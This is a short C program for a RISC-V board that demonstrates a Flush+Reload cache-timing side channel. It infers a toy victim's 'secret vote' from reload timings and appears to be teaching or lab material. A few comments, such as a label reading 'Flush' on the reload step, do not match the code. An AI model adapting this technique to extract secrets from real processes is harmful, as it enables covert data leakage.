#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <assert.h>
#include "./rlibsc.h"

#define PAGE_SIZE	0x1000
#define LINE_SIZE	64
#define LINE_A		2
#define LINE_B		15
char __attribute__((aligned(PAGE_SIZE))) my_buf[PAGE_SIZE] = {0};
#define votes_a		my_buf[LINE_A*LINE_SIZE+2]
#define votes_b		my_buf[LINE_B*LINE_SIZE+2]

void secret_vote(char candidate) {
    if (candidate == 'a')
    	votes_a++;
    else
	votes_b++;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ③ TIMER: clock_gettime(CLOCK_MONOTONIC_RAW)
 *
 * Returns nanoseconds.
 * TH1520 mtime resolution = 1/3000000 s = 333 ns per tick.
 * Single-shot measurements of L1 hits and DRAM misses are both sub-tick
 * and therefore unreliable.  We use ACCUMULATED totals — see section ⑥.
 * ═══════════════════════════════════════════════════════════════════════════ */

static __attribute__((always_inline)) inline
uint64_t timespec_to_ns(const struct timespec *ts)
{
    return (uint64_t)ts->tv_sec * UINT64_C(1000000000)
         + (uint64_t)ts->tv_nsec;
}

/*
 * read_ns() — current CLOCK_MONOTONIC_RAW time in nanoseconds.
 *
 * Implemented as a vDSO call on Linux/RISC-V (no kernel entry for most
 * calls).  Overhead ≈ 30–60 ns (dominated by the mtime register read).
 * The RISC-V fences prevent OoO reordering of the probe load across the
 * timer call boundary.
 */
static __attribute__((always_inline)) inline uint64_t read_ns(void)
{
    struct timespec ts;
    asm volatile("fence rw, rw" ::: "memory");
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts); // thread cpu time id or process cpu time id
    asm volatile("fence rw, rw" ::: "memory");
    return timespec_to_ns(&ts);
}

static inline void
access_memory(void* pointer) {
    volatile uint32_t value;
    asm volatile ("lw %0, 0(%1)\n\t"
        : "=r" (value)
        : "r" (pointer)
        );
}

int main(int argc, char* argv[]) {
    int SAMPLES = 10;
    size_t time_a = 0;
    size_t time_b = 0;

    for (int i = 0; i < SAMPLES; i++) {
    	// 1. Flush
	flush(&votes_a);
	fence();

	flush(&votes_b);
	fence();

    	// 2. Victim executes
    	secret_vote('b');

    	// 3. Flush
	size_t start = read_ns();
	access_memory(&votes_a);
	size_t end = read_ns();
	time_a += end - start;

	start = read_ns();
	access_memory(&votes_b);
	end = read_ns();
	time_b += end - start;
    }

    printf("Time for votes_a: %ld; Time for votes_b: %ld\n", time_a, time_b);
    printf("Average time for votes_a: %lu; Average time for votes_b: %lu\n", time_a/SAMPLES, time_b/SAMPLES);

    if (time_a < time_b)
	printf("Victim vote a\n");
    else
	printf("Victim vote b\n");

    return 0;
}
